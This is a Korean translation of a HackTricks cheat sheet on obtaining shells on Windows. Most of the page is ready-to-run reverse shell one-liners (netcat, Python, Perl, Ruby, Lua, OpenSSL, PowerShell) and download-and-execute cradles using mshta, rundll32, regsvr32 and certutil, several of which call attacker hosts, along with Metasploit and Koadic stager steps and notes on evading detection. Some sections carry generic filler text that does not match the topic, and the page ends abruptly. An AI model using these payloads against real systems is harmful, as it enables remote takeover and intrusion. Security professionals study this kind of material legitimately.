# 쉘 - Windows

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

[https://lolbas-project.github.io/](https://lolbas-project.github.io/) 페이지는 Windows용 [https://gtfobins.github.io/](https://gtfobins.github.io/)와 같습니다.\
분명히 **Windows에는 SUID 파일이나 sudo 권한이 없지만**, 일부 **바이너리**가 (남용하여) **임의의 코드를 실행**할 수 있는 방법을 알고 있는 것이 유용합니다.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/)는 휴대용이면서 안전한 Netcat 대안**입니다. 이는 Unix 계열 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 정의 소스 포트 및 지속적인 재연결과 같은 기능을 갖춘 sbd는 TCP/IP 통신에 대한 다목적 솔루션을 제공합니다. Windows 사용자에게는 Kali Linux 배포판의 sbd.exe 버전을 신뢰할 수 있는 Netcat 대체품으로 사용할 수 있습니다.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## 파이썬

Python is a versatile programming language that is widely used in the field of hacking. It is known for its simplicity and readability, making it a popular choice among hackers. Python provides a wide range of libraries and modules that can be used for various hacking tasks, such as network scanning, web scraping, and exploit development.

파이썬은 다재다능한 프로그래밍 언어로, 해킹 분야에서 널리 사용됩니다. 간결하고 가독성이 좋다는 특징으로 알려져 있어 해커들 사이에서 인기가 있습니다. 파이썬은 네트워크 스캐닝, 웹 스크래핑, 익스플로잇 개발과 같은 다양한 해킹 작업에 사용할 수 있는 다양한 라이브러리와 모듈을 제공합니다.

### Python Shells

Python shells are interactive environments where you can execute Python code and see the results immediately. They are useful for testing and experimenting with code snippets before incorporating them into larger scripts or programs. There are several Python shells available, including the standard Python shell, IPython, and Jupyter Notebook.

파이썬 쉘은 파이썬 코드를 실행하고 결과를 즉시 확인할 수 있는 대화형 환경입니다. 이는 코드 조각을 테스트하고 실험하는 데 유용하며, 이후 큰 스크립트나 프로그램에 통합하기 전에 사용할 수 있습니다. 표준 파이썬 쉘, IPython 및 Jupyter Notebook을 포함하여 여러 가지 파이썬 쉘이 있습니다.

### Python Reverse Shells

A reverse shell is a technique used by hackers to establish a connection from a compromised system to an attacker-controlled system. Python provides several libraries and modules that can be used to create reverse shells, such as `socket`, `subprocess`, and `pty`. These libraries allow hackers to execute commands on the compromised system and receive the output on their own system.

리버스 쉘은 해커가 침투한 시스템에서 공격자가 제어하는 시스템으로 연결을 수립하는 기술입니다. 파이썬은 `socket`, `subprocess`, `pty`와 같은 여러 라이브러리와 모듈을 제공하여 리버스 쉘을 생성하는 데 사용할 수 있습니다. 이러한 라이브러리를 사용하면 해커는 침투한 시스템에서 명령을 실행하고 자신의 시스템에서 결과를 받을 수 있습니다.

### Python Web Shells

A web shell is a script that is uploaded to a compromised web server and allows hackers to execute commands on the server remotely. Python can be used to create web shells by leveraging its web frameworks, such as Flask and Django. These frameworks provide the necessary tools and functionality to handle HTTP requests and execute commands on the server.

웹 쉘은 침투한 웹 서버에 업로드되는 스크립트로, 해커가 원격으로 서버에서 명령을 실행할 수 있게 합니다. 파이썬은 Flask 및 Django와 같은 웹 프레임워크를 활용하여 웹 쉘을 생성하는 데 사용될 수 있습니다. 이러한 프레임워크는 HTTP 요청을 처리하고 서버에서 명령을 실행하기 위한 필요한 도구와 기능을 제공합니다.

### Python Post-Exploitation Modules

Post-exploitation refers to the activities performed by hackers after gaining unauthorized access to a system. Python provides various modules that can be used for post-exploitation tasks, such as privilege escalation, lateral movement, and data exfiltration. These modules can be used to gather information, escalate privileges, and maintain persistence on the compromised system.

포스트 익스플로잇은 해커가 무단으로 시스템에 접근한 후 수행하는 작업을 의미합니다. 파이썬은 권한 상승, 측면 이동, 데이터 유출과 같은 포스트 익스플로잇 작업에 사용할 수 있는 다양한 모듈을 제공합니다. 이러한 모듈은 정보 수집, 권한 상승, 침투한 시스템에서의 지속성 유지를 위해 사용될 수 있습니다.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl은 강력하고 다목적인 스크립팅 언어로, 윈도우 환경에서도 많이 사용됩니다. Perl을 사용하여 원격으로 명령 실행을 수행하거나 파일을 다운로드하고 업로드하는 등의 작업을 수행할 수 있습니다.

### 원격 명령 실행

Perl을 사용하여 원격으로 명령을 실행하는 방법은 다음과 같습니다.

```perl
use Net::SSH2;

my $ssh = Net::SSH2->new();
$ssh->connect('호스트', 포트) or die "연결 실패: $!";
$ssh->auth_password('사용자', '비밀번호') or die "인증 실패";

my $command = '실행할 명령';
my ($stdout, $stderr, $exit) = $ssh->cmd($command);

print "표준 출력: $stdout\n";
print "표준 에러: $stderr\n";
print "종료 코드: $exit\n";
```

### 파일 다운로드

Perl을 사용하여 원격 서버에서 파일을 다운로드하는 방법은 다음과 같습니다.

```perl
use Net::SFTP::Foreign;

my $sftp = Net::SFTP::Foreign->new('호스트');
$sftp->login('사용자', '비밀번호') or die "로그인 실패";

my $remote_file = '원격 파일 경로';
my $local_file = '로컬 파일 경로';

$sftp->get($remote_file, $local_file) or die "다운로드 실패";
```

### 파일 업로드

Perl을 사용하여 원격 서버로 파일을 업로드하는 방법은 다음과 같습니다.

```perl
use Net::SFTP::Foreign;

my $sftp = Net::SFTP::Foreign->new('호스트');
$sftp->login('사용자', '비밀번호') or die "로그인 실패";

my $local_file = '로컬 파일 경로';
my $remote_file = '원격 파일 경로';

$sftp->put($local_file, $remote_file) or die "업로드 실패";
```

Perl을 사용하여 원격 명령 실행, 파일 다운로드 및 파일 업로드와 같은 작업을 수행할 수 있습니다. 이러한 기능은 편리하게 사용할 수 있으며, 원격 서버와의 상호작용을 간단하게 처리할 수 있습니다.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## 루비

루비는 동적인 객체 지향 프로그래밍 언어로, 간결하고 읽기 쉬운 문법을 가지고 있습니다. 루비는 다양한 운영 체제에서 사용할 수 있으며, 웹 개발, 시스템 관리, 데이터 분석 등 다양한 분야에서 활용됩니다.

### 루비 쉘

루비 쉘은 시스템 명령어를 실행하고 결과를 반환하는 기능을 제공합니다. 이를 통해 운영 체제와 상호 작용하고, 파일 시스템, 네트워크 등 다양한 작업을 수행할 수 있습니다.

#### 쉘 명령어 실행

루비 쉘에서 시스템 명령어를 실행하려면 `system` 메서드를 사용합니다. 다음은 예시입니다.

```ruby
system("ls -la")
```

위의 예시는 `ls -la` 명령어를 실행하고 결과를 반환합니다.

#### 명령어 실행 결과 가져오기

루비 쉘에서 명령어 실행 결과를 가져오려면 `backticks` 또는 `%x{}`를 사용합니다. 다음은 예시입니다.

```ruby
result = `ls -la`
```

위의 예시는 `ls -la` 명령어를 실행하고 결과를 `result` 변수에 저장합니다.

#### 쉘 명령어 실행 후 종료 코드 확인

루비 쉘에서 명령어 실행 후 종료 코드를 확인하려면 `$?` 변수를 사용합니다. 다음은 예시입니다.

```ruby
system("ls -la")
puts $?.exitstatus
```

위의 예시는 `ls -la` 명령어를 실행하고 종료 코드를 출력합니다.

### 루비 원격 쉘

루비를 사용하여 원격 시스템에 접속하고 명령어를 실행할 수도 있습니다. 이를 위해 `Net::SSH` 라이브러리를 사용합니다.

#### 원격 시스템에 접속하기

루비에서 원격 시스템에 접속하려면 `Net::SSH.start` 메서드를 사용합니다. 다음은 예시입니다.

```ruby
require 'net/ssh'

Net::SSH.start('hostname', 'username', password: 'password') do |ssh|
  # 원격 시스템에 명령어를 실행하는 코드 작성
end
```

위의 예시에서 `hostname`은 원격 시스템의 호스트 이름, `username`은 사용자 이름, `password`는 비밀번호입니다.

#### 명령어 실행하기

원격 시스템에 접속한 후에는 `Net::SSH` 객체를 사용하여 명령어를 실행할 수 있습니다. 다음은 예시입니다.

```ruby
require 'net/ssh'

Net::SSH.start('hostname', 'username', password: 'password') do |ssh|
  result = ssh.exec!("ls -la")
  puts result
end
```

위의 예시는 원격 시스템에서 `ls -la` 명령어를 실행하고 결과를 출력합니다.

#### 원격 쉘 종료하기

원격 시스템과의 연결을 종료하려면 `Net::SSH` 객체의 `close` 메서드를 사용합니다. 다음은 예시입니다.

```ruby
require 'net/ssh'

Net::SSH.start('hostname', 'username', password: 'password') do |ssh|
  # 원격 시스템에 명령어를 실행하는 코드 작성
  ssh.close
end
```

위의 예시에서 `hostname`은 원격 시스템의 호스트 이름, `username`은 사용자 이름, `password`는 비밀번호입니다.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua는 간단하고 가벼운 스크립팅 언어로, 다양한 응용 프로그램에서 사용됩니다. Lua는 C로 작성되어 있으며, C 코드와 함께 사용할 수 있습니다. Lua는 다른 프로그래밍 언어와의 통합을 용이하게 하기 위해 설계되었습니다.

Lua는 다양한 운영 체제에서 실행될 수 있으며, 다양한 플랫폼에서 사용할 수 있습니다. Lua는 간단한 문법과 직관적인 구조를 가지고 있어 쉽게 배울 수 있습니다.

Lua는 스크립트 언어로 사용되는 경우가 많습니다. 이는 Lua를 사용하여 게임, 웹 애플리케이션, 임베디드 시스템 등 다양한 응용 프로그램을 개발할 수 있다는 것을 의미합니다.

Lua는 강력한 기능을 제공하며, 다양한 라이브러리와 확장 기능을 사용할 수 있습니다. Lua는 사용자 정의 데이터 타입을 지원하며, 메타테이블을 사용하여 객체 지향 프로그래밍을 구현할 수 있습니다.

Lua는 빠른 실행 속도와 작은 메모리 사용량을 가지고 있어, 성능이 중요한 응용 프로그램에서도 효과적으로 사용될 수 있습니다. Lua는 가비지 컬렉션을 사용하여 메모리 관리를 자동화하며, 이를 통해 개발자가 메모리 관리에 신경 쓰지 않고도 안정적인 프로그램을 작성할 수 있습니다.

Lua는 다양한 분야에서 사용되는 강력한 스크립팅 언어입니다. Lua를 사용하여 다양한 프로젝트를 개발하고 실행할 수 있습니다.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

공격자 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
피해자
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## 파워쉘

Powershell은 Microsoft Windows 운영 체제에서 사용되는 명령 줄 인터페이스 및 스크립팅 언어입니다. 파워쉘은 .NET 프레임워크를 기반으로 하며, 시스템 관리, 자동화 및 스크립팅 작업에 널리 사용됩니다.

### 파워쉘 셸 실행

파워쉘을 실행하려면 다음 명령을 사용합니다:

```powershell
powershell
```

### 파워쉘 스크립트 실행

파워쉘 스크립트를 실행하려면 다음 명령을 사용합니다:

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```

### 파워쉘 원격 실행

원격 시스템에서 파워쉘을 실행하려면 다음 명령을 사용합니다:

```powershell
Enter-PSSession -ComputerName <target> -Credential <credentials>
```

### 파워쉘 명령어

파워쉘에서는 다양한 명령어를 사용할 수 있습니다. 몇 가지 일반적인 명령어는 다음과 같습니다:

- `Get-Process`: 실행 중인 프로세스 목록을 가져옵니다.
- `Get-Service`: 시스템 서비스 목록을 가져옵니다.
- `Get-ChildItem`: 디렉토리 내의 파일 및 폴더 목록을 가져옵니다.
- `Set-ExecutionPolicy`: 스크립트 실행 정책을 설정합니다.
- `Invoke-WebRequest`: 웹 요청을 보냅니다.

### 파워쉘 스크립팅

파워쉘은 강력한 스크립팅 언어로, 자동화된 작업을 수행하는 데 사용됩니다. 스크립트를 작성하려면 다음과 같은 구문을 사용합니다:

```powershell
# 주석
$변수 = 값
if (조건) {
    # 조건이 참일 때 실행되는 코드
} else {
    # 조건이 거짓일 때 실행되는 코드
}
```

### 파워쉘 확장

파워쉘은 다양한 확장 기능을 제공합니다. 몇 가지 유용한 확장은 다음과 같습니다:

- PowerSploit: 다양한 공격 기능을 제공하는 파워쉘 스크립트 모음입니다.
- Empire: 포스트-익스플로이테이션 프레임워크로, 원격 시스템에서 제어를 얻는 데 사용됩니다.
- BloodHound: Active Directory 환경에서 권한 상승 경로를 분석하는 도구입니다.

### 파워쉘을 이용한 공격

파워쉘은 다양한 공격 기법에 사용될 수 있습니다. 몇 가지 일반적인 공격 기법은 다음과 같습니다:

- 파워쉘 리버스 셸: 원격 시스템에 역쉘이 설치되어 제어를 얻는 기법입니다.
- 파워쉘 스크립트 실행: 악성 스크립트를 실행하여 시스템에 악성 코드를 배포하는 기법입니다.
- 파워쉘 쉘코드: 파워쉘을 사용하여 악성 쉘코드를 작성하는 기법입니다.

### 파워쉘 보안

파워쉘은 강력한 도구이지만, 악용될 수도 있습니다. 보안을 강화하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 실행 정책 설정: 스크립트 실행 정책을 제한하여 악성 스크립트의 실행을 방지합니다.
- 서명된 스크립트 사용: 서명된 스크립트를 사용하여 스크립트의 신뢰성을 보장합니다.
- 원격 실행 제한: 원격 시스템에서 파워쉘 실행을 제한하여 악용을 방지합니다.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
네트워크 호출을 수행하는 프로세스: **powershell.exe**\
디스크에 기록된 페이로드: **아니오** (_procmon을 사용하여 찾을 수 있는 곳에는 없습니다!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
네트워크 호출을 수행하는 프로세스: **svchost.exe**\
디스크에 기록된 페이로드: **WebDAV 클라이언트 로컬 캐시**

**한 줄 요약:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**다양한 Powershell 쉘에 대한 자세한 정보는 이 문서의 끝에서 확인하세요**

## Mshta

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 확인하세요
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **hta-psh 역쉘의 예시 (hta를 사용하여 PS 백도어 다운로드 및 실행)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Koadic 좀비를 stager hta를 사용하여 매우 쉽게 다운로드하고 실행할 수 있습니다.**

#### hta 예제

[**여기에서**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**여기에서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It can be used as a vector for delivering malicious payloads. In this section, we will explore how to use Mshta with Metasploit to gain remote access to a target system.

##### **Step 1: Generate the HTA Payload**

First, we need to generate the HTA payload using Metasploit. We can do this by using the `msfvenom` command. Here is an example command to generate the payload:

```
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker IP> LPORT=<attacker port> -f hta-psh -o payload.hta
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the reverse connection.

##### **Step 2: Set Up the Listener**

Next, we need to set up a listener in Metasploit to receive the connection from the target system. Use the following commands in the Metasploit console:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <attacker IP>
set LPORT <attacker port>
exploit -j
```

Again, replace `<attacker IP>` and `<attacker port>` with your IP address and the port you specified in Step 1.

##### **Step 3: Execute the HTA Payload**

Now, we need to execute the HTA payload on the target system. This can be done by running the following command in a Windows command prompt:

```
mshta.exe payload.hta
```

Make sure to replace `payload.hta` with the name of the HTA payload file you generated in Step 1.

##### **Step 4: Gain Remote Access**

If everything is set up correctly, you should see a new session opened in the Metasploit console. This means that you have successfully gained remote access to the target system. You can now use various Metasploit commands to explore and interact with the compromised system.

##### **Conclusion**

Using Mshta with Metasploit provides a powerful method for gaining remote access to a target system. By understanding how to generate and execute HTA payloads, you can effectively exploit vulnerabilities and maintain control over compromised systems.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**방어자에 의해 감지됨**




## **Rundll32**

[**Dll hello world 예제**](https://github.com/carterjones/hello-world-dll)

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**방어자에 의해 감지됨**

**Rundll32 - sct**

[**여기에서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17) 참조하세요.
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit, on the other hand, is a powerful penetration testing framework. By combining these two tools, we can leverage the Rundll32 utility to execute malicious DLL files on a target system.

To use Rundll32 with Metasploit, follow these steps:

1. Generate a malicious DLL payload using Metasploit. This can be done using the `msfvenom` command.

2. Transfer the generated DLL payload to the target system. This can be done using various methods such as email, USB drive, or file transfer protocols.

3. Open a command prompt on the target system and use the following command to execute the malicious DLL payload:

   ```
   rundll32.exe <path_to_malicious_dll>,<entry_point_function>
   ```

   Replace `<path_to_malicious_dll>` with the path to the transferred DLL payload, and `<entry_point_function>` with the name of the function to be executed within the DLL.

4. Once executed, the malicious DLL payload will run on the target system, allowing the attacker to gain unauthorized access or perform other malicious activities.

It is important to note that the use of Rundll32 with Metasploit can be detected by antivirus software. To avoid detection, it is recommended to use techniques such as obfuscation or encryption to hide the malicious payload. Additionally, using a combination of other techniques and tools can further enhance the effectiveness of the attack.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes Rundll32 for post-exploitation is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses Rundll32 to load its DLL payload and establish a backdoor on the target machine.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload can then be loaded using Rundll32 by specifying the path to the DLL file and the function to execute.

Here is an example command to execute a Koadic payload using Rundll32:

```
rundll32.exe <path_to_malicious_dll>,<function_name>
```

Once the payload is executed, Koadic establishes a connection with the attacker's command-and-control server, allowing them to remotely control the compromised system.

It is important to note that the use of Rundll32 for malicious purposes can be detected by security solutions. Therefore, attackers often employ various obfuscation techniques to evade detection, such as encrypting the payload or using process hollowing to inject the DLL into a legitimate process.

To defend against Rundll32-based attacks, organizations should implement strong security measures, such as endpoint protection, network segmentation, and regular patching. Additionally, monitoring for suspicious Rundll32 activity and conducting regular security assessments can help detect and mitigate potential threats.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 참조하세요.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**방어자에 의해 감지됨**

#### Regsvr32 -sct

[**여기에서**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1) 참조하세요.
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be leveraged as a technique for executing malicious code on a target system. This technique can be used in combination with Metasploit to gain unauthorized access to a target system.

To use Regsvr32 with Metasploit, follow these steps:

1. Generate a malicious DLL payload using Metasploit. This payload will be executed when the DLL is registered using Regsvr32.

2. Transfer the malicious DLL payload to the target system. This can be done using various methods, such as email attachments, USB drives, or exploiting vulnerabilities in other software.

3. Open a command prompt on the target system and navigate to the directory where the malicious DLL payload is located.

4. Register the DLL using the following command: `regsvr32 /s <malicious_dll_name.dll>`

   Replace `<malicious_dll_name.dll>` with the actual name of the malicious DLL payload.

5. Once the DLL is registered, the malicious code will be executed on the target system, providing the attacker with unauthorized access.

It is important to note that this technique may trigger antivirus alerts or be detected by security software. Therefore, it is crucial to use evasion techniques to bypass detection and maintain persistence on the target system.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Koadic 좀비를 regsvr 스테이저를 사용하여 매우 쉽게 다운로드하고 실행할 수 있습니다**

## Certutil

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 

B64dll을 다운로드하고 디코딩하여 실행합니다.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
B64exe 파일을 다운로드하고, 디코딩한 후 실행합니다.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Defender에 의해 감지됨**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘부터.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
